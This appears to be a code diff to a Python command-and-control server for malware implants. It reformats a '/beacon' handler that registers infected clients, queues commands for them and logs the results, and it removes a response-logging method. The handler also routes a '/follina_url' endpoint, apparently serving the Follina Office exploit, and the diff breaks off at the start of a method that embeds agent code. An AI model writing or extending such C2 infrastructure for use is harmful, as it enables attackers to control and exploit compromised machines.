@@ -20,10 +20,6 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
 
     def log_message(self, format, *args):
         self.logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")
-        
-    def log_command_response(self, client_id, command, response):
-      self.logger(f"Command: {command}  |  Response: {response} | Client ID: {client_id}")
-      self.client_manager.log_event(client_id, "Command response", f"Command: {command}  |  Response: {response}")
 
     def do_GET(self):
         # Log the request details
@@ -46,7 +42,7 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
         elif self.path == "/follina_url":
             self.send_follina_response()
         elif self.path == "/beacon":
-          self.handle_beacon()
+            self.handle_beacon()
         else:
             # Send HTTP response status code
             self.send_response(200)
@@ -58,22 +54,23 @@ class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
             self.wfile.write(message.encode("utf-8"))
     
     def handle_beacon(self):
-      client_id = self.client_address[0]
-      self.logger(f"Beacon from {client_id}")
-      self.client_manager.add_client(client_id)
-      commands = self.client_manager.get_pending_commands(client_id)
-      self.logger(f"Commands send to client {client_id}: {commands}")
-      # Log the command received from the client
-      for command in commands:
-          self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
-      commands_json = json.dumps(commands)
-      #send commands to the client
-      self.send_response(200)
-      self.send_header("Content-type", "application/json")
-      self.end_headers()
-      self.wfile.write(commands_json.encode("utf-8"))
-      self.client_manager.clear_pending_commands(client_id)
+        client_id = self.client_address[0]
+        self.logger(f"Beacon from {client_id}")
+        self.client_manager.add_client(client_id)
+        commands = self.client_manager.get_pending_commands(client_id)
+        self.logger(f"Commands send to client {client_id}: {commands}")
+        # Log the command received from the client
+        for command in commands:
+            self.client_manager.log_event(client_id, "Command send", f"Type: {command['command_type']}, Args: {command['args']}")
+        commands_json = json.dumps(commands)
+        #send commands to the client
+        self.send_response(200)
+        self.send_header("Content-type", "application/json")
+        self.end_headers()
+        self.wfile.write(commands_json.encode("utf-8"))
+        self.client_manager.clear_pending_commands(client_id)
 
+    # [All the other methods remain the same]
     def send_agent_response(self):
         # Define the agent code
         agent_code = """
